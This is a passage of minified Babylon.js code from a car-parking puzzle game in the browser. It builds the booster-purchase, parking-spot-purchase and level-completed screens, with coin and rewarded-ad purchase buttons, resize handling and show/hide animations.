0,SCENE_TRANSITION_DURATION,b,1,!1,function(){screenPurchaseBooster.guiRoot.isVisible=!1;null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.disableControls();this.guiRoot.alpha=0;this.guiRoot.isVisible=!0;this.guiRoot.topInPixels=50*Resolution.SCALE;this.onResize();this.SCORE=0;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",0,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,
"alpha",1,SCENE_TRANSITION_DURATION,b,1,!1,function(){null!=a&&a();screenPurchaseBooster.enableControls()}.bind(this))},beforeRender:function(){},onResize:function(){if(this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.imgBackground.resize(a,b);a>=b?this.pnlPurchaseBooster.scaleTo(.7*Resolution.SCALE):(this.pnlPurchaseBooster.scaleTo(1*Resolution.SCALE),1100*this.pnlPurchaseBooster.scaleY>b&&this.pnlPurchaseBooster.scaleTo(b/1100));this.pnlPurchaseBooster.topInPixels=
40*Resolution.SCALE;this.resizeShadows()}},resizeShadows:function(){var a=this.txtTitle._fontSize._value/55;this.txtTitle.shadowOffsetX=getShadowOffs(0);this.txtTitle.shadowOffsetY=getShadowOffs(5*a);a=this.txtStuffDesc._fontSize._value/26;this.txtStuffDesc.shadowOffsetX=getShadowOffs(0);this.txtStuffDesc.shadowOffsetY=getShadowOffs(5*a);this.txtStuffDesc.outlineWidth=5*a;a=this.btnPay.children[1]._fontSize._value/35;this.btnPay.children[1].shadowOffsetX=getShadowOffs(0);this.btnPay.children[1].shadowOffsetY=
getShadowOffs(4*a);this.btnPay.children[1].outlineWidth=4*a;a=this.btnFree.children[1]._fontSize._value/35;this.btnFree.children[1].shadowOffsetX=getShadowOffs(0);this.btnFree.children[1].shadowOffsetY=getShadowOffs(4*a);this.btnFree.children[1].outlineWidth=4*a}};var ScreenPurchaseSpot=function(a){ScreenPurchaseSpot.instance=this;this.create(a)};ScreenPurchaseSpot.instance=null;
ScreenPurchaseSpot.prototype={create:function(a){this.scene=a;this.createGui();this.disableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createBackground(this.guiRoot);this.createPurchaseSpotPanel(this.pnlRoot);this.createBody(this.pnlPurchaseSpot,0);this.createTitle(this.pnlPurchaseSpot,-402);this.createBottomButtons(this.pnlPurchaseSpot,260)},createRootPanel:function(a){this.pnlRoot=
new BABYLON.GUI.Rectangle("ScreenPurchaseSpot.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.clipContent=!0;this.pnlRoot.clipChildren=!0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=2;a.addControl(this.pnlRoot);return this.pnlRoot},createPurchaseSpotPanel:function(a){this.pnlPurchaseSpot=new BABYLON.GUI.Rectangle("pnlPurchaseSpot");
this.pnlPurchaseSpot.transformCenterX=.5;this.pnlPurchaseSpot.transformCenterY=.5;this.pnlPurchaseSpot.isPointerBlocker=!1;this.pnlPurchaseSpot.isHitTestVisible=!1;this.pnlPurchaseSpot.clipContent=!1;this.pnlPurchaseSpot.clipChildren=!1;this.pnlPurchaseSpot.thickness=0;this.pnlPurchaseSpot.widthInPixels=650;this.pnlPurchaseSpot.heightInPixels=920;this.pnlPurchaseSpot.color="yellow";a.addControl(this.pnlPurchaseSpot);this.pnlPurchaseSpot.scaleTo=function(b){this.scaleX=this.scaleY=b};return this.pnlPurchaseSpot},
createBackground:function(a){this.imgBackground=new BABYLON.GUI.Rectangle("imgBackground");this.imgBackground.transformCenterX=.5;this.imgBackground.transformCenterY=.5;this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=!1;this.imgBackground.clipContent=!1;this.imgBackground.clipChildren=!1;this.imgBackground.thickness=0;this.imgBackground.color="orange";this.imgBackground.background="rgba(35,35,35,0.7)";a.addControl(this.imgBackground);this.imgBackground.resize=function(b,
e){e+=100*Resolution.SCALE;this.widthInPixels=b+5;this.heightInPixels=e;this.parent.heightInPixels=e}},createTitle:function(a,b){this.imgTitleBg=new BABYLON.GUI.Image("imgTitleBg");this.imgTitleBg.transformCenterX=.5;this.imgTitleBg.transformCenterY=.5;this.imgTitleBg.isPointerBlocker=!1;this.imgTitleBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgTitleBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"title_panel_orange.png");this.imgTitleBg.leftInPixels=0;this.imgTitleBg.topInPixels=b;
a.addControl(this.imgTitleBg);this.txtTitle=new BABYLON.GUI.TextBlock("txtTitle");this.txtTitle.textWrapping=!0;this.txtTitle.leftInPixels=0;this.txtTitle.topInPixels=b-5;this.txtTitle.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.color=
"#FFFFFF";this.txtTitle.text="BUY STUFF";this.txtTitle.fontSize="55px";this.txtTitle.fontFamily="gamefont";this.txtTitle.leftInPixels=0;this.txtTitle.isPointerBlocker=!1;this.txtTitle.isHitTestVisible=!1;this.txtTitle.shadowOffsetX=0;this.txtTitle.shadowOffsetY=6;this.txtTitle.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtTitle.outlineColor="rgb(0,0,0)";this.txtTitle.outlineWidth=5;this.txtTitle.shadowBlur=5;a.addControl(this.txtTitle);this.btnClose=BABYLON.GUI.Button.CreateImageOnlyButton("btnClose");
this.btnClose.children[0].transformCenterY=.5;this.btnClose.children[0].transformCenterX=.5;this.btnClose.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnClose.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnClose.transformCenterX=.5;this.btnClose.transformCenterY=.5;this.btnClose.topInPixels=b-1;this.btnClose.leftInPixels=220;a.addControl(this.btnClose);SetImageFromSpritesheet(this.btnClose.children[0],getAssetImage("pak1"),
getAssetImageFrames("pak1"),"button_close.png");ResetGuiButtonAppearance(this.btnClose,this.btnClose.children[0].sourceWidth,this.btnClose.children[0].sourceHeight);this.btnClose.onPointerClickObservable.add(this.onClosePressed)},createBody:function(a,b){this.imgBodyBg=new BABYLON.GUI.Image("imgBodyBg");this.imgBodyBg.transformCenterX=.5;this.imgBodyBg.transformCenterY=.5;this.imgBodyBg.isPointerBlocker=!1;this.imgBodyBg.isHitTestVisible=!1;this.imgBodyBg.leftInPixels=0;this.imgBodyBg.topInPixels=
b;this.imgBodyBg.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBodyBg.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBodyBg.scaleX=this.imgBodyBg.scaleY=2;SetImageFromSpritesheet(this.imgBodyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"bg_panel_orange.png");a.addControl(this.imgBodyBg);this.imgSpotIcon=new BABYLON.GUI.Image("imgSpotIcon");this.imgSpotIcon.transformCenterX=.5;this.imgSpotIcon.transformCenterY=.5;this.imgSpotIcon.isPointerBlocker=
!1;this.imgSpotIcon.isHitTestVisible=!1;this.imgSpotIcon.leftInPixels=0;this.imgSpotIcon.topInPixels=b-125;this.imgSpotIcon.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgSpotIcon.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgSpotIcon.scaleX=this.imgSpotIcon.scaleY=1.4;SetImageFromSpritesheet(this.imgSpotIcon,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_parking_slot.png");a.addControl(this.imgSpotIcon);this.txtPlusOne=new BABYLON.GUI.TextBlock("txtPlusOne");
this.txtPlusOne.textWrapping=!0;this.txtPlusOne.leftInPixels=105;this.txtPlusOne.topInPixels=b-110;this.txtPlusOne.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtPlusOne.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtPlusOne.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtPlusOne.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtPlusOne.color="#FFFFFF";this.txtPlusOne.text="+1";this.txtPlusOne.fontSize=
"85px";this.txtPlusOne.fontFamily="gamefont";this.txtPlusOne.isPointerBlocker=!1;this.txtPlusOne.isHitTestVisible=!1;this.txtPlusOne.shadowOffsetX=0;this.txtPlusOne.shadowOffsetY=6;this.txtPlusOne.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtPlusOne.outlineColor="rgb(0,0,0)";this.txtPlusOne.outlineWidth=5;this.txtPlusOne.shadowBlur=5;a.addControl(this.txtPlusOne);this.txtStuffDesc=new BABYLON.GUI.TextBlock("txtStuffDesc");this.txtStuffDesc.textWrapping=!0;this.txtStuffDesc.widthInPixels=
420;this.txtStuffDesc.leftInPixels=0;this.txtStuffDesc.topInPixels=b+135;this.txtStuffDesc.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtStuffDesc.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtStuffDesc.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtStuffDesc.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtStuffDesc.color="#FFFFFF";this.txtStuffDesc.text="REARRANGE THE COLOR OF THE\nVEHICLES IN PARKING LOT";
this.txtStuffDesc.fontSize="26px";this.txtStuffDesc.fontFamily="gamefont";this.txtStuffDesc.leftInPixels=0;this.txtStuffDesc.isPointerBlocker=!1;this.txtStuffDesc.isHitTestVisible=!1;this.txtStuffDesc.shadowOffsetX=0;this.txtStuffDesc.shadowOffsetY=6;this.txtStuffDesc.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtStuffDesc.outlineColor="rgb(0,0,0)";this.txtStuffDesc.outlineWidth=5;this.txtStuffDesc.shadowBlur=5;a.addControl(this.txtStuffDesc)},createBottomButtons:function(a,
b){this.btnFree=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnFree","FREE");this.btnFree.clipContent=!1;this.btnFree.children[0].transformCenterY=.5;this.btnFree.children[0].transformCenterX=.5;this.btnFree.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnFree.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnFree.children[1].fontFamily="gamefont";this.btnFree.children[1].fontSize="35px";this.btnFree.children[1].topInPixels=
-8;this.btnFree.children[1].color="#ffffff";this.btnFree.children[1].shadowOffsetX=3;this.btnFree.children[1].shadowOffsetY=3;this.btnFree.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnFree.children[1].shadowBlur=5;this.btnFree.children[1].outlineColor="rgb(0,0,0)";this.btnFree.children[1].outlineWidth=3;this.btnFree.children[1].lineSpacing=5;this.btnFree.transformCenterX=.5;this.btnFree.transformCenterY=.5;this.btnFree.topInPixels=b;this.btnFree.leftInPixels=
0;a.addControl(this.btnFree);SetImageFromSpritesheet(this.btnFree.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_green_top.png");ResetGuiButtonAppearance(this.btnFree,this.btnFree.children[0].sourceWidth,this.btnFree.children[0].sourceHeight);this.btnFree.onPointerClickObservable.add(this.onPurchaseForAdPressed);this.imgPayAd=new BABYLON.GUI.Image("imgPayAd");this.imgPayAd.transformCenterX=.5;this.imgPayAd.transformCenterY=.5;this.imgPayAd.isPointerBlocker=!1;this.imgPayAd.isHitTestVisible=
!1;this.imgPayAd.leftInPixels=145;this.imgPayAd.topInPixels=b-45;this.imgPayAd.rotation=DegToRad(20);this.imgPayAd.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayAd.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayAd.scaleX=this.imgPayAd.scaleY=.75;SetImageFromSpritesheet(this.imgPayAd,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_watch_ad.png");a.addControl(this.imgPayAd);this.btnPay=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnPay",
"100");this.btnPay.children[0].transformCenterY=.5;this.btnPay.children[0].transformCenterX=.5;this.btnPay.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnPay.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnPay.children[1].fontFamily="gamefont";this.btnPay.children[1].fontSize="45px";this.btnPay.children[1].topInPixels=-8;this.btnPay.children[1].color="#ffffff";this.btnPay.children[1].shadowOffsetX=3;this.btnPay.children[1].shadowOffsetY=
3;this.btnPay.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnPay.children[1].shadowBlur=5;this.btnPay.children[1].outlineColor="rgb(0,0,0)";this.btnPay.children[1].outlineWidth=3;this.btnPay.children[1].lineSpacing=5;this.btnPay.transformCenterX=.5;this.btnPay.transformCenterY=.5;this.btnPay.topInPixels=b;this.btnPay.leftInPixels=0;this.btnPay.scaleX=this.btnPay.scaleY=.9;a.addControl(this.btnPay);SetImageFromSpritesheet(this.btnPay.children[0],getAssetImage("pak1"),
getAssetImageFrames("pak1"),"button_orange_top.png");ResetGuiButtonAppearance(this.btnPay,this.btnPay.children[0].sourceWidth,this.btnPay.children[0].sourceHeight);this.btnPay.onPointerClickObservable.add(this.onPurchaseForCashPressed.bind(this));this.imgPayCoin=new BABYLON.GUI.Image("imgPayCoin");this.imgPayCoin.transformCenterX=.5;this.imgPayCoin.transformCenterY=.5;this.imgPayCoin.isPointerBlocker=!1;this.imgPayCoin.isHitTestVisible=!1;this.imgPayCoin.leftInPixels=0;this.imgPayCoin.topInPixels=
-6;this.imgPayCoin.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayCoin.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayCoin.scaleX=this.imgPayCoin.scaleY=.9;SetImageFromSpritesheet(this.imgPayCoin,getAssetImage("pak1"),getAssetImageFrames("pak1"),"coin_button.png");this.btnPay.addControl(this.imgPayCoin);this.btnPay.setText=function(e){this.children[1].text=e;e=getTextWidth(screenGame.guiTexture.getContext(),this.children[1].text,this.children[1].fontFamily,
this.children[1]._fontSize._value);var f=this.children[2].widthInPixels*this.children[2].scaleX;this.children[2].leftInPixels=-(e+f+7)/2+e/2-12;this.children[1].leftInPixels=this.children[2].leftInPixels+f/2+7+e/2}},setBooster:function(a){this.booster=a;this.txtTitle.text=STR(a.toUpperCase());this.txtStuffDesc.text=STR(a.toUpperCase()+"_DESC");SetImageFromSpritesheet(this.imgSpotIcon,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_"+this.booster.toLowerCase()+"_big.png")},setPrice:function(a){this.price=
a;this.btnPay.setText(""+a)},updateTexts:function(){this.txtTitle.text=STR("CAR_PARK");this.txtStuffDesc.text=STR("UNLOCK_CAR_PARK");updateTextToWidth(this.txtTitle,screenGame.guiTexture.getContext(),340,55,1);this.btnFree.children[1].text=STR("FREE");updateTextToWidth(this.btnFree.children[1],screenGame.guiTexture.getContext(),200,38,1);var a=this.btnFree.children[1]._fontSize._value/38;this.btnFree.children[1].lineSpacing=-10*a;this.btnFree.children[1].topInPixels=-10*a;0<this.btnFree.children[1].text.indexOf("\n")&&
(this.btnFree.children[1].topInPixels=-5*a)},updateData:function(){},onClosePressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenPurchaseSpot.hideScene(function(){activeScene.gamePaused=!1;activeScene.gameRunning=!0;screenGame.enableControls();Buttons.enabled=!0}))},onRestartPressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenPurchaseSpot.hideScene(function(){activeScene.gamePaused=!1;screenGame.resetGame();Buttons.enabled=
!0}.bind(this)))},onPurchaseForCashPressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenTopPanel.purchaseForCash(this.price,!1)?screenPurchaseSpot.hideScene(function(){screenGame.enableControls();screenGame.spotPurchased(this.spot);activeScene.gamePaused=!1;activeScene.gameRunning=!0;Buttons.enabled=!0}.bind(this)):Buttons.enabled=!0)},onPurchaseForAdPressed:function(){Buttons.enabled&&(soundManager.playSound("button"),Buttons.enabled=!1,RewardAds.showRewAd(activeScene.scene,
function(){screenPurchaseSpot.hideScene(function(){activeScene.gamePaused=!1;screenGame.enableControls();screenGame.spotPurchased(screenPurchaseSpot.spot);Buttons.enabled=!0}.bind(this))},function(){Buttons.enabled=!0},this))},enableControls:function(){enableButton(this.btnClose);enableButton(this.btnFree)},disableControls:function(){disableButton(this.btnClose);disableButton(this.btnFree)},hideScene:function(a){void 0===a&&(a=null);this.disableControls();activeScene.scene.animationTimeScale=1;activeScene.gamePaused=
!1;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",-50*Resolution.SCALE,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",0,SCENE_TRANSITION_DURATION,b,1,!1,function(){screenPurchaseSpot.guiRoot.isVisible=!1;null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.disableControls();this.guiRoot.alpha=0;this.guiRoot.isVisible=!0;this.guiRoot.topInPixels=
50*Resolution.SCALE;this.onResize();this.btnPay.isVisible=!inlModule.rewardAds.active;this.imgPayAd.isVisible=inlModule.rewardAds.active;this.btnFree.isVisible=inlModule.rewardAds.active;this.SCORE=0;this.setPrice(PRICE_NEW_SPOT);var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",0,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",1,SCENE_TRANSITION_DURATION,b,
1,!1,function(){null!=a&&a();screenPurchaseSpot.enableControls()}.bind(this))},beforeRender:function(){},onResize:function(){if(this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.imgBackground.resize(a,b);a>=b?this.pnlPurchaseSpot.scaleTo(.7*Resolution.SCALE):(this.pnlPurchaseSpot.scaleTo(1*Resolution.SCALE),1100*this.pnlPurchaseSpot.scaleY>b&&this.pnlPurchaseSpot.scaleTo(b/1100));this.pnlPurchaseSpot.topInPixels=40*Resolution.SCALE;this.resizeShadows()}},resizeShadows:function(){var a=
this.txtTitle._fontSize._value/55;this.txtTitle.shadowOffsetX=getShadowOffs(0);this.txtTitle.shadowOffsetY=getShadowOffs(5*a);a=this.txtStuffDesc._fontSize._value/26;this.txtStuffDesc.shadowOffsetX=getShadowOffs(0);this.txtStuffDesc.shadowOffsetY=getShadowOffs(5*a);this.txtStuffDesc.outlineWidth=5*a;a=this.btnFree.children[1]._fontSize._value/35;this.btnFree.children[1].shadowOffsetX=getShadowOffs(0);this.btnFree.children[1].shadowOffsetY=getShadowOffs(4*a);this.btnFree.children[1].outlineWidth=4*
a}};var ScreenLevelCompleted=function(a){ScreenLevelCompleted.instance=this;this.create(a)};ScreenLevelCompleted.instance=null;
ScreenLevelCompleted.prototype={create:function(a){this.scene=a;this.createGui();this.disableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createBackground(this.guiRoot);this.imgShine1=this.createShine(this.pnlRoot,2);this.imgShine2=this.createShine(this.pnlRoot,1.7);this.createLevelCompletedPanel(this.pnlRoot);this.createBody(this.pnlLevelCompleted,0);this.createTitle(this.pnlLevelCompleted,
-402);this.createBottomButtons(this.pnlLevelCompleted,250)},createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenLevelCompleted.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.clipContent=!1;this.pnlRoot.clipChildren=!1;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=3;a.addControl(this.pnlRoot);
return this.pnlRoot},createShine:function(a,b){var e=new BABYLON.GUI.Image("imgShine");e.transformCenterX=.5;e.transformCenterY=.5;e.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;e.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;e.isPointerBlocker=!1;e.isHitTestVisible=!1;e.topInPixels=0;e.leftInPixels=0;e._scale=1;a.addControl(e);SetImageFromSpritesheet(e,getAssetImage("pak1"),getAssetImageFrames("pak1"),"rotation_effect_win.png");Object.defineProperty(e,"SCALE",
{get:function(){return this._scale},set:function(f){this._scale=f;this.scaleX=this.scaleY=this._scale*Resolution.SCALE},enumerable:!0,configurable:!0});CommonAnimations.AnimateObjectProperty(e,"SCALE",.9,1500,{func:BABYLON.CubicEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEINOUT},1,!0,null,[[0,1*b],[.5,.9*b],[1,1*b]]);return e},createLevelCompletedPanel:function(a){this.pnlLevelCompleted=new BABYLON.GUI.Rectangle("pnlLevelCompleted");this.pnlLevelCompleted.transformCenterX=.5;this.pnlLevelCompleted.transformCenterY=
.5;this.pnlLevelCompleted.isPointerBlocker=!1;this.pnlLevelCompleted.isHitTestVisible=!1;this.pnlLevelCompleted.clipContent=!0;this.pnlLevelCompleted.clipChildren=!0;this.pnlLevelCompleted.thickness=0;this.pnlLevelCompleted.widthInPixels=650;this.pnlLevelCompleted.heightInPixels=920;this.pnlLevelCompleted.color="yellow";a.addControl(this.pnlLevelCompleted);this.pnlLevelCompleted.scaleTo=function(b){this.scaleX=this.scaleY=b};return this.pnlLevelCompleted},createBackground:function(a){this.imgBackground=
new BABYLON.GUI.Rectangle("imgBackground");this.imgBackground.transformCenterX=.5;this.imgBackground.transformCenterY=.5;this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=!1;this.imgBackground.clipContent=!1;this.imgBackground.clipChildren=!1;this.imgBackground.thickness=0;this.imgBackground.color="orange";this.imgBackground.background="rgba(35,35,35,0.7)";a.addControl(this.imgBackground);this.imgBackground.resize=function(b,e){e+=300*Resolution.SCALE;this.widthInPixels=b+
5;this.heightInPixels=e;this.parent.heightInPixels=e}},createTitle:function(a,b){this.imgTitleBg=new BABYLON.GUI.Image("imgTitleBg");this.imgTitleBg.transformCenterX=.5;this.imgTitleBg.transformCenterY=.5;this.imgTitleBg.isPointerBlocker=!1;this.imgTitleBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgTitleBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"title_panel_lime.png");this.imgTitleBg.leftInPixels=0;this.imgTitleBg.topInPixels=b;a.addControl(this.imgTitleBg);this.txtTitle=new BABYLON.GUI.TextBlock("txtTitle");
this.txtTitle.textWrapping=!0;this.txtTitle.leftInPixels=0;this.txtTitle.topInPixels=b-5;this.txtTitle.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.color="#FFFFFF";this.txtTitle.text="Game ended";this.txtTitle.fontSize=
"55px";this.txtTitle.fontFamily="gamefont";this.txtTitle.leftInPixels=0;this.txtTitle.isPointerBlocker=!1;this.txtTitle.isHitTestVisible=!1;this.txtTitle.shadowOffsetX=0;this.txtTitle.shadowOffsetY=6;this.txtTitle.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtTitle.outlineColor="rgb(0,0,0)";this.txtTitle.outlineWidth=5;this.txtTitle.shadowBlur=5;a.addControl(this.txtTitle)},createBody:function(a,b){this.imgBodyBg=new BABYLON.GUI.Image("imgBodyBg");this.imgBodyBg.transformCenterX=
.5;this.imgBodyBg.transformCenterY=.5;this.imgBodyBg.isPointerBlocker=!1;this.imgBodyBg.isHitTestVisible=!1;this.imgBodyBg.leftInPixels=0;this.imgBodyBg.topInPixels=b;this.imgBodyBg.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBodyBg.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBodyBg.scaleX=this.imgBodyBg.scaleY=2;SetImageFromSpritesheet(this.imgBodyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"bg_panel_lime.png");a.addControl(this.imgBodyBg);
this.txtCompleted=new BABYLON.GUI.TextBlock("txtCompleted");this.txtCompleted.textWrapping=!0;this.txtCompleted.leftInPixels=0;this.txtCompleted.topInPixels=b-260;this.txtCompleted.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtCompleted.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtCompleted.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtCompleted.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;
this.txtCompleted.color="#FFFFFF";this.txtCompleted.text="Completed";this.txtCompleted.fontSize="40px";this.txtCompleted.fontFamily="gamefont";this.txtCompleted.leftInPixels=0;this.txtCompleted.isPointerBlocker=!1;this.txtCompleted.isHitTestVisible=!1;this.txtCompleted.shadowOffsetX=0;this.txtCompleted.shadowOffsetY=6;this.txtCompleted.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtCompleted.outlineColor="rgb(0,0,0)";this.txtCompleted.outlineWidth=5;this.txtCompleted.shadowBlur=
5;a.addControl(this.txtCompleted);this.imgBigCoin=new BABYLON.GUI.Image("imgBigCoin");this.imgBigCoin.transformCenterX=.5;this.imgBigCoin.transformCenterY=.5;this.imgBigCoin.isPointerBlocker=!1;this.imgBigCoin.isHitTestVisible=!1;this.imgBigCoin.leftInPixels=0;this.imgBigCoin.topInPixels=b-30;this.imgBigCoin.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBigCoin.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBigCoin.scaleX=this.imgBigCoin.scaleY=
1.4;SetImageFromSpritesheet(this.imgBigCoin,getAssetImage("pak1"),getAssetImageFrames("pak1"),"coin_big.png");a.addControl(this.imgBigCoin);this.txtRewardValue=new BABYLON.GUI.TextBlock("txtRewardValue");this.txtRewardValue.textWrapping=!0;this.txtRewardValue.leftInPixels=0;this.txtRewardValue.topInPixels=b+80;this.txtRewardValue.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtRewardValue.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtRewardValue.textHorizontalAlignment=
BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtRewardValue.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtRewardValue.color="rgba(255,255,255,1)";this.txtRewardValue.text="+50";this.txtRewardValue.fontSize="157px";this.txtRewardValue.fontFamily="gamefont";this.txtRewardValue.leftInPixels=0;this.txtRewardValue.isPointerBlocker=!1;this.txtRewardValue.isHitTestVisible=!1;this.txtRewardValue.shadowOffsetX=0;this.txtRewardValue.shadowOffsetY=6;this.txtRewardValue.shadowColor=
